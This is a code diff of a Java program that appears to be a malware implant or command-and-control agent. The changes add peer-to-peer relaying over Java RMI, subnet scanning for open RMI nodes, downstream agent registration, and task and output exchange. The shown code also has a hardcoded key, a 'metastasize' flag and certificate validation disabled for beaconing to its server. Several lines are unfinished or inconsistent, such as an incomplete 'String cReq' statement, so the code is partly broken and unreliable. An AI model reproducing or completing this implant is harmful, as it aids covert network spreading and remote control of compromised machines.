@@ -35,8 +35,10 @@ import javax.xml.transform.*;
 import javax.xml.transform.stream.StreamResult;
 import java.net.UnknownHostException;
 import java.nio.charset.StandardCharsets;
+import java.rmi.Naming;
 import java.rmi.Remote;
 import java.rmi.RemoteException;
+import java.rmi.registry.LocateRegistry;
 import java.rmi.server.UnicastRemoteObject;
 import java.security.InvalidAlgorithmParameterException;
 import java.security.KeyManagementException;
@@ -79,7 +81,8 @@ class nConfig
     public static String defaultKey = "A54f6YY2_1@31395b5v5+9592_4081l0";
     public static String encKey = "A54f6YY2_1@31395b5v5+9592_4081l0";
     public static int metastasize = 0;
-    public static String upstream = "127.0.0.1";
+    public static String server = "127.0.0.1";
+    public static String upstreamHost = "";
     public static int upstreamPort = 35506;
     public static int springReachable = 1;
     public static int isKeystone = 0;
@@ -101,6 +104,7 @@ public class Main
     static public String cookieData = "null";
     static public String sessUUID = "";
     static public String nonce = "";
+    static public ArrayList p2pList = new ArrayList();
     static public ArrayList tasks = new ArrayList();
     static public Hashtable downstreamAgents = new Hashtable();
     static public ArrayList output = new ArrayList();
@@ -128,6 +132,8 @@ public class Main
         //start loop
         //if no authentication has occurred before, the keepalive will find autolib and a task object for metadata and to start the metastasizer
         //TimeUnit.MILLISECONDS.sleep((nUtil.rngenerator(19,37))*1000);
+        nComm.findP2P();
+
         keepalive();
     }
 
@@ -143,15 +149,24 @@ public class Main
         // 1. scan for p2p
         // 2. if p2p available, use it
         // 3. if p2p is not available, try connecting via https
-        // 4. if downstream > 5, try reaching out via https
+        // 4. if downstream > 3, try reaching out via https
         // 5. if impossible to reach https endpoint
+
+
 
         for (c=0; c<4; c++)
         {
 
             try
             {  
-                String cReq = nComm.request(nComm.mkAuth(),"auth");
+                if (p2pList.size() > 0)
+                {
+                    String cReq 
+                }
+                else
+                {
+                    String cReq = nComm.request(nComm.mkAuth(),"auth");
+                }
 
                 if (cReq != "null")
                 {
@@ -506,6 +521,18 @@ public class Main
         }
     }
 
+    public class P2PServer
+    {
+        public void rmiServer()
+        {
+            Registry nRegistry = LocateRegistry.createRegistry(config.upstreamPort);
+
+            P2PInterface srvObj = new P2PSrvImpl();
+
+            Naming.bind("0000RemRegImplEx", (Remote) srvObj);
+        }
+    }
+
     public interface P2PInterface extends Remote
     {
         //creates cookie session object and adds uuid to downstream agents
@@ -520,11 +547,11 @@ public class Main
         public String disconnect(String uuid, String cookie, String nonce) throws RemoteException;
     }
 
-    public class P2PSrv extends UnicastRemoteObject implements RMIInterface
-    {
-        protected P2PSrv() throws RemoteException
+    public class P2PSrvImpl extends UnicastRemoteObject implements P2PInterface
+    {        
+        protected P2PSrvImpl() throws RemoteException
         {
-            super(config.upstreamPort);
+            super();
         }
 
         @Override
@@ -584,7 +611,7 @@ public class Main
         }
 
         @Override
-        public Hashtable get(String uuid, String cookie, String downstreamNonce) throws RemoteException
+        public ArrayList get(String uuid, String cookie, String downstreamNonce) throws RemoteException
         {
             String authBlob = new String(
                 Base64.getDecoder().decode(
@@ -620,7 +647,7 @@ public class Main
         }
 
         @Override
-        public Hashtable put(String uuid, String cookie, String downstreamNonce, ArrayList data) throws RemoteException
+        public String put(String uuid, String cookie, String downstreamNonce, ArrayList data) throws RemoteException
         {
             String authBlob = new String(
                 Base64.getDecoder().decode(
@@ -637,6 +664,7 @@ public class Main
                 {
                     output.add(data.get(d));
                 }
+                return "ok";
             }
             else
             {
@@ -668,7 +696,7 @@ public class Main
         }
 
 
-        mkCookie(String uuid, String passMat)
+        public String mkCookie(String uuid, String passMat)
         {
             String timeStamp = new SimpleDateFormat("yyyy.MM.dd.HH.mm.ss").format(new java.util.Date());
 			Hashtable cookieMaterialRaw = new Hashtable();
@@ -688,7 +716,7 @@ public class Main
 
     public class P2PClient
     {
-
+        
     }
 
     class network
@@ -727,7 +755,7 @@ public class Main
             return subnetAddrs;
         }
 
-        public ArrayList findP2P()
+        public void findP2P()
         {
             ArrayList ipAddresses = new ArrayList();
 
@@ -747,9 +775,7 @@ public class Main
             }
 
             ArrayList netAddresses = calcSubnetAddrs(ipAddresses);
-            ArrayList localNodes = findOpenRMI(netAddresses);
-
-            return localNodes;
+            nCore.p2pList = findOpenRMI(netAddresses);
         }
 
         private String mkAuth() throws Exception, InvalidKeyException, InvalidAlgorithmParameterException, IllegalBlockSizeException, BadPaddingException
@@ -773,7 +799,7 @@ public class Main
             SSLContext sslCon = SSLContext.getInstance("TLS");
             sslCon.init(null, new TrustManager[] {new InvalidCertificateTrustManager()}, null);
             
-            String fmtUri = String.format("https://%s/%s",config.upstream,config.endpoints.get(endpointType).toString());
+            String fmtUri = String.format("https://%s/%s",config.server,config.endpoints.get(endpointType).toString());
             System.out.println(fmtUri);
 
             URL ctrlUrl = new URI(fmtUri).toURL();
